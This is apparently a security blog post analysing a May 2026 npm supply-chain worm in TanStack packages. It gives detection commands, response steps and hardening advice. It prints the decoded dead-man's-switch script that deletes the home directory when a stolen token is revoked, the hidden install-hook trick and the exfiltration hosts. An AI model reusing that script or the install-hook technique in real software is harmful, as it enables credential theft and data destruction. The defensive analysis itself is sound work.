---
title: "TanStack npm Worm: The Supply-Chain Attack With a Dead-Man's Switch"
excerpt: "On May 11, 2026, attackers republished 14+ official TanStack packages on npm with a worm that signs itself with valid SLSA provenance and arms a dead-man's switch that wipes your home directory the moment you revoke the stolen GitHub token. Here is what happened, how the payload works, and how to check your machine."
category:
  name: 'DevOps'
  slug: 'devops'
date: '2026-05-12'
publishedAt: '2026-05-12T09:00:00Z'
updatedAt: '2026-05-12T09:00:00Z'
readingTime: '11 min read'
author:
  name: 'DevOps Daily Team'
  slug: 'devops-daily-team'
featured: true
tags:
  - DevOps
  - Security
  - Supply Chain
  - npm
  - CICD
  - GitHub Actions
---

On May 11, 2026, at around 19:20 UTC, two new versions of `@tanstack/react-router` appeared on npm. They were signed with valid SLSA provenance, published through the project's existing GitHub Actions OIDC trusted-publisher binding, and showed up as `latest` within minutes. By the end of the day, 14+ official TanStack packages were on the list, the worm had already propagated to 200+ downstream packages, and one detail in the payload was making people delete their npm caches with shaky hands: if you revoke the stolen GitHub token, a background process polling api.github.com sees the 401 and runs `rm -rf ~/`.

This post walks through what the attack did, why your normal incident-response reflex (revoke the leaked token) is the exact thing it wants you to do, and the commands to run right now to confirm you are not infected.

## TL;DR

- TanStack's npm publish workflow was compromised. The attacker published valid, SLSA-signed versions of `@tanstack/react-router`, `@tanstack/react-start`, `@tanstack/router-core`, `@tanstack/history`, and ~10 more official packages.
- The packages install fine and behave normally. They smuggle a 2.3 MB obfuscated `router_init.js` into each tarball and trigger it through a malicious `optionalDependencies` entry that points at an orphan commit in a forked GitHub repo.
- On install, the payload harvests AWS IMDS credentials, GCP metadata, Kubernetes service-account tokens, Vault tokens, GitHub tokens, SSH keys, and `~/.npmrc`, then exfiltrates over Session/Oxen (a fully end-to-end encrypted messenger network with no centralized C2 to block).
- It also drops a dead-man's switch: a shell script registered as a `systemd --user` service on Linux or a LaunchAgent on macOS that polls `api.github.com/user` every 60 seconds with the stolen token. The moment that token starts returning HTTP 40x (because you revoked it), the script runs `rm -rf ~/` and exits. There is a 24-hour TTL after which it gives up on its own.
- The worm also enumerates other packages each compromised maintainer owns (via `registry.npmjs.org/-/v1/search?text=maintainer:`) and republishes them with the same injection, which is how 200+ unrelated packages picked up the payload before takedown.
- If you ran `npm install` against affected versions, follow the detection commands below before revoking anything.

## Prerequisites

- Familiarity with how npm runs lifecycle scripts on install
- Basic shell access to whichever machine ran `npm install` recently
- A GitHub Personal Access Token or fine-grained token if you want to assess your token blast radius

## What got compromised

Per the GitHub issue thread and the post-mortem at [tanstack.com/blog/npm-supply-chain-compromise-postmortem](https://tanstack.com/blog/npm-supply-chain-compromise-postmortem), the confirmed-bad versions are:

| Package | First bad version | Second bad version (was `latest`) |
|---|---|---|
| `@tanstack/history` | 1.161.9 | 1.161.12 |
| `@tanstack/router-utils` | 1.161.11 | 1.161.14 |
| `@tanstack/router-core` | 1.169.5 | 1.169.8 |
| `@tanstack/router-devtools-core` | 1.167.6 | 1.167.9 |
| `@tanstack/react-router-devtools` | 1.166.16 | 1.166.19 |
| `@tanstack/router-generator` | 1.166.45 | 1.166.48 |
| `@tanstack/virtual-file-routes` | 1.161.10 | 1.161.13 |
| `@tanstack/router-plugin` | 1.167.38 | 1.167.41 |
| `@tanstack/react-router` | 1.169.5 | 1.169.8 |
| `@tanstack/router-devtools` | 1.166.16 | 1.166.19 |
| `@tanstack/react-start` | 1.167.68 | 1.167.71 |
| `@tanstack/router-cli` | 1.166.46 | 1.166.49 |
| `@tanstack/router-vite-plugin` | 1.166.53 | 1.166.56 |
| `@tanstack/solid-router` | 1.169.5 | 1.169.8 |

Bad versions were live from roughly 19:20 UTC to npm takedown. The worm also republished 200+ packages owned by other maintainers it touched. Socket maintains a running list at [socket.dev/supply-chain-attacks/mini-shai-hulud](https://socket.dev/supply-chain-attacks/mini-shai-hulud).

`@tanstack/query*`, `@tanstack/table*`, `@tanstack/form*`, `@tanstack/virtual*`, and `@tanstack/store` were not affected.

## The trick: `optionalDependencies` pointing at a hidden orphan commit

The packages themselves look normal. The malicious code is loaded by a single line in `package.json`:

```json
"optionalDependencies": {
  "@tanstack/setup": "github:tanstack/router#79ac49eedf774dd4b0cfa308722bc463cfe5885c"
}
```

When you run `npm install`, npm resolves that git dependency by fetching the `tanstack/router` repo at commit `79ac49ee`. That commit is an orphan pushed to a fork specifically so it does not appear in the default branch history. Because npm treats git dependencies as "build from source," it pulls down the commit's declared dependencies (including `bun`) and runs the `prepare` lifecycle script:

```json
"scripts": {
  "prepare": "bun run tanstack_runner.js  && exit 1"
}
```

The `&& exit 1` is the clever bit. It makes the optional install fail, so npm silently discards `@tanstack/setup` from the dependency tree and produces no error in the install output. But `bun run tanstack_runner.js` already ran. `tanstack_runner.js` then loads the real payload, `router_init.js`, a 2.3 MB obfuscated file that the attacker smuggled into the tarball at the package root. The file is not listed in the package's `"files"` array and nothing else references it, so it would not appear in a casual code review of the package source.

This is what `npm pack` shows on a confirmed-bad version:

```bash
npm pack @tanstack/history@1.161.12   # does NOT run install scripts
tar -xzf *.tgz
cat package/package.json | grep -A3 optionalDependencies
ls -la package/router_init.js
```

If `router_init.js` exists and the `optionalDependencies` entry points at a `tanstack/router#<sha>` git ref, that copy is malicious.

## What the payload actually does

On a successful install, `router_init.js` runs three workloads:

1. **Credential harvest.** It walks the standard cloud and developer credential locations: AWS IMDS (`169.254.169.254`) and Secrets Manager, GCP instance metadata, Kubernetes service-account tokens (`/var/run/secrets/kubernetes.io/serviceaccount/token`), Vault tokens, `~/.npmrc`, GitHub tokens (from `~/.config/gh/hosts.yml` and env), and SSH private keys under `~/.ssh`.
2. **Exfiltration over Session.** The harvested data is uploaded to file endpoints on the Session/Oxen messenger network: `filev2.getsession.org`, `seed{1,2,3}.getsession.org`. Session is an end-to-end encrypted dead-drop with no central server the defender can sinkhole, so traditional IOC blocklists do not help here.
3. **Self-propagation.** It queries `https://registry.npmjs.org/-/v1/search?text=maintainer:<victim>` to enumerate every package the compromised maintainer owns, then republishes each one with the same `optionalDependencies` injection and the same `router_init.js` smuggled into the tarball. This is the worm part: every infected maintainer becomes a new vector. Socket counts 200+ packages this way as of writing.

This is roughly what makes the incident structurally different from `event-stream` or `colors.js`. There is no shady contributor to spot in the PR history. There is no missing 2FA. The compromise happened in the publish pipeline itself, the cryptographic provenance proves the tarball came from the project, and the malicious code does not appear in the package's source tree because it is fetched at install time from a fork.

## The dead-man's switch

This is the part of the payload most defenders are not used to thinking about. Before exfiltrating credentials, the script installs a watchdog:

- On Linux, a `systemd --user` service under `~/.config/systemd/user/` that runs `~/.local/bin/gh-token-monitor.sh`.
- On macOS, a LaunchAgent named `com.user.gh-token-monitor` under `~/Library/LaunchAgents/`.

The script polls the GitHub API every 60 seconds. If the response status starts returning 40x, the handler runs and the script exits.

The decoded script (extracted from the obfuscated `router_init.js` payload, [thanks to lmt-swallow on the issue thread](https://github.com/TanStack/router/issues/7383#issuecomment-4427502147)):

```bash
#!/usr/bin/env bash
set -euo pipefail

CONFIG_DIR="${HOME}/.config/gh-token-monitor"
GITHUB_TOKEN="$(cat "${CONFIG_DIR}/token")"
HANDLER="$(cat "${CONFIG_DIR}/handler")"
STARTED_FILE="${CONFIG_DIR}/started_at"

MAX_TTL=86400        # 24 hours
CHECK_INTERVAL=60    # poll every minute

if [[ ! -f "$STARTED_FILE" ]]; then
  date +%s > "$STARTED_FILE"
fi
START_TIME=$(cat "$STARTED_FILE")

while true; do
  ELAPSED=$(( $(date +%s) - START_TIME ))

  if [[ $ELAPSED -ge $MAX_TTL ]]; then
    # 24h reached, give up cleanly so we are not a long-term footprint
    rm -f "$STARTED_FILE"
    exit 0
  fi

  HTTP_STATUS=$(curl -s -o /dev/null -w "%{http_code}" \
    -H "Authorization: Bearer ${GITHUB_TOKEN}" \
    -H "Accept: application/vnd.github+json" \
    "https://api.github.com/user") || true

  if [[ "$HTTP_STATUS" =~ ^40[0-9]$ ]]; then
    # Token was revoked. Trigger the handler (rm -rf ~/) and exit.
    eval "$HANDLER"
    rm -f "$STARTED_FILE"
    exit 0
  fi

  sleep $CHECK_INTERVAL
done
```

The handler stored in `${CONFIG_DIR}/handler` is `rm -rf "$HOME"` (or equivalent, since implementations vary by victim build of the payload). The 24-hour TTL is interesting: after 24 hours the script exits on its own, which means there is a narrow window for this to fire. If you are reading this more than a day after the May 11 release window, the dead-man's switch on a previously infected machine has likely already disarmed itself, but the credential exfiltration and any other persistence mechanisms are still in place.

The takeaway for the operational response is uncomfortable but real: do not start by revoking the GitHub token. First check whether the machine that ran `npm install` is infected, then disarm the watchdog (delete the systemd user service, the launch agent, and the script), then revoke. If you revoke first on a machine where the watchdog is still running, the next poll within 60 seconds runs `rm -rf $HOME`.

## How to check your machine

Run these on any developer workstation or CI runner that installed an affected version on or after May 11, 2026, 19:20 UTC:

```bash
# Files the payload drops
find ~ -path '*/.claude/setup.mjs' -o -path '*/.vscode/setup.mjs' 2>/dev/null
find ~/.config -name '*gh-token-monitor*' 2>/dev/null
find ~/.local/bin -name 'gh-token-monitor.sh' 2>/dev/null
find /tmp -name 'tmp.ts018051808.lock' 2>/dev/null

# Running processes
ps aux | grep -E 'tanstack_runner|router_runtime|gh-token-monitor|bun' | grep -v grep
```

On Linux, also check the systemd user unit:

```bash
systemctl --user list-unit-files | grep -i gh-token
systemctl --user status gh-token-monitor.service 2>/dev/null
```

On macOS, also check LaunchAgents:

```bash
launchctl list | grep -i gh-token-monitor
ls -la ~/Library/LaunchAgents/ | grep -i gh-token-monitor
```

And look directly at the tarballs in your npm cache for the smuggled `router_init.js`:

```bash
find ~/.npm/_cacache -name 'tanstack-*.tgz' -exec sh -c '
  for f; do
    if tar -tzf "$f" 2>/dev/null | grep -q "package/router_init.js"; then
      echo "INFECTED: $f"
    fi
  done
' _ {} +
```

If any of the above returns a hit, treat the machine as compromised and follow the response below before touching tokens.

## Response, in order

1. **Disarm the watchdog before revoking tokens.** Stop the service, delete the script, kill any hanging `gh-token-monitor` or `bun tanstack_runner` processes.

   Linux:

   ```bash
   systemctl --user stop gh-token-monitor.service 2>/dev/null
   systemctl --user disable gh-token-monitor.service 2>/dev/null
   rm -f ~/.config/systemd/user/gh-token-monitor.service
   rm -f ~/.local/bin/gh-token-monitor.sh
   rm -rf ~/.config/gh-token-monitor
   systemctl --user daemon-reload
   pkill -f gh-token-monitor || true
   pkill -f tanstack_runner || true
   ```

   macOS:

   ```bash
   launchctl unload ~/Library/LaunchAgents/com.user.gh-token-monitor.plist 2>/dev/null
   rm -f ~/Library/LaunchAgents/com.user.gh-token-monitor.plist
   rm -f ~/.local/bin/gh-token-monitor.sh
   rm -rf ~/.config/gh-token-monitor
   pkill -f gh-token-monitor || true
   pkill -f tanstack_runner || true
   ```

2. **Pin lockfiles back to a known-good version range**, delete `node_modules` and `package-lock.json` / `bun.lock` / `yarn.lock`, reinstall from scratch on a clean machine.

3. **Rotate everything the payload could have touched** *after* you have disarmed the watchdog: GitHub tokens (PATs and OAuth app installs), npm tokens, AWS access keys, GCP service-account keys, Vault tokens, SSH keys, `~/.npmrc` auth lines. If a CI runner installed an affected version, rotate that runner's IAM role too because the payload pulls IMDS credentials from inside the runner.

4. **Check your npm publish history.** If you maintain other packages on the same machine, the worm may have already republished them. Look at recent publish events on `npmjs.com/~<your-user>` for tarballs you did not push.

5. **Audit GitHub Actions logs** for any workflow runs that exported the `NODE_AUTH_TOKEN` or `npm_token` environment in the last 24 hours. If your publish workflow runs on `pull_request` from forks, treat the entire publish pipeline as suspect.

## Why SLSA provenance and 2FA did not help

The TanStack team had:

- Two-factor authentication on every maintainer account.
- npm trusted-publisher binding via GitHub Actions OIDC, so npm tokens never live on a maintainer machine.
- SLSA build provenance on every published tarball.

The malicious versions had all three. They were signed by the real publishing workflow, OIDC-bound to the real GitHub repo, and the provenance cryptographically proves they came out of the TanStack CI environment. To npm and to anyone verifying provenance, the bad versions look 100% legitimate, because in a strict sense they are: they came from the project's own pipeline. The compromise was earlier in the chain. A workflow file was modified to publish what the attacker wanted, OIDC then minted the publish token, and the audit trail records a clean release.

SLSA provenance answers "did this artifact come from this build pipeline?" It does not answer "did this build pipeline only run code its maintainers wrote?" That gap is exactly where this attack lives, and the difference between this and prior npm worm incidents is that the payload now includes the destructive watchdog, not just credential theft.

## Hardening for next time

```text
        Source                Build                Publish
          │                     │                      │
          ▼                     ▼                      ▼
   ┌────────────┐        ┌────────────┐       ┌─────────────┐
   │  Reviewed  │  ───▶  │   CI in    │  ──▶  │ npm registry│
   │   commits  │        │  sandbox   │       │ (SLSA proof)│
   └────────────┘        └────────────┘       └─────────────┘
        ▲                     ▲                      ▲
        │                     │                      │
    branch              isolated runners        publish workflow
    protection +        + pinned action SHAs    on `release`  
    required reviews    + no `pull_request`     events only,
                        from forks               not on `push`
```

Concrete actions you can take this week:

- **Pin every third-party GitHub Action to a commit SHA**, not a tag. Tag references are mutable. The TanStack post-mortem confirms this was part of the hardening they shipped after the incident.
- **Restrict `pull_request` runs from forks** for any workflow that has access to publish secrets. Use `pull_request_target` with `repository_owner` guards, or split into two workflows and only run the secret-using one on `release` events from the upstream repo.
- **Use `npm ci` with `--ignore-scripts` in CI** for anything that does not actually need lifecycle scripts. Library builds usually do not.
- **Adopt dependency cooldowns.** The malicious window was open for hours. Tools like Renovate, Dependabot grouping, or socket.dev's [package cooldown rules](https://socket.dev/) can hold new versions for 24-72 hours before letting them into your repo, which is enough time for a community-driven detection like this one to land.
- **Audit `optionalDependencies`** specifically. The clever trick in this attack is that the malicious dependency is technically optional, so its failure does not break installs and does not show up in normal install logs. `npm install --dry-run` against a confirmed-bad version still shows the `tanstack/router#<sha>` reference, which is the cleanest signal.
- **Treat your OIDC trust binding as a high-value secret.** Rotating npm tokens does nothing if the workflow itself is what republishes packages. The TanStack team's post-mortem explicitly notes this: until the OIDC binding was revoked, the worm could keep publishing.

## What we are watching

A few open threads as of May 12 morning:

- npm's takedown timing. Carlini's report went in within minutes of the publish. The malicious versions were installable for several hours afterward. Socket's tracker has the cleanest view of the per-package timeline.
- Whether the same workflow-injection technique is being reused against other large npm orgs in the next 24 hours. The Nx incident in 2025 saw copy-cat attacks within days.
- Long-term persistence. The 24-hour TTL on the dead-man's switch suggests the attacker did not want a long footprint. Other persistence mechanisms reported in the GitHub thread (`*/.claude/setup.mjs`, `*/.vscode/setup.mjs`) have not been fully analyzed yet at time of writing.

## Sources

- TanStack GitHub issue with the full technical thread: [TanStack/router#7383](https://github.com/TanStack/router/issues/7383)
- TanStack post-mortem: [tanstack.com/blog/npm-supply-chain-compromise-postmortem](https://tanstack.com/blog/npm-supply-chain-compromise-postmortem)
- Nicholas Carlini's initial fingerprint and package list: [issue comment](https://github.com/TanStack/router/issues/7383#issuecomment-4424629798)
- Decoded `gh-token-monitor.sh` script: [issue comment from lmt-swallow](https://github.com/TanStack/router/issues/7383#issuecomment-4427502147)
- Socket running tracker: [socket.dev/supply-chain-attacks/mini-shai-hulud](https://socket.dev/supply-chain-attacks/mini-shai-hulud)
- StepSecurity write-up: [stepsecurity.io/blog/mini-shai-hulud-is-back-a-self-spreading-supply-chain-attack-hits-the-npm-ecosystem](https://www.stepsecurity.io/blog/mini-shai-hulud-is-back-a-self-spreading-supply-chain-attack-hits-the-npm-ecosystem)
- Earlier tweet thread with the dead-man's switch detail: [@intcyberdigest on X](https://x.com/intcyberdigest/status/2053983157628596484)

Run the detection commands. Disarm before you revoke.
